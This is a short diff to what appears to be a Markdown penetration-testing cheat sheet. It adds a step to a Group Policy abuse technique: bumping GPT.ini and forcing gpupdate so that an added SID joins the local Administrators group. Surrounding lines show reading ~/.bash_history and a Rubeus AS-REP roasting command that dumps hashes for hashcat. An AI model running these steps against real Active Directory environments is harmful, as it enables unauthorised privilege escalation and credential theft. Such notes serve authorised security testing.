@@ -472,6 +472,7 @@ cat ~/.bash_history
 `[Group Membership]`  
 `*S-1-5-32-544__Memberof =`  
 `*S-1-5-32-544__Members = *S-1-5-21-3453094141-4163309614-2941200192-1104`  
+1. Then increment GPT.ini in `{policyID}`, `gpupdate /force`, relog  
 
 ## AD - No preauth ASREP
 	./Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat
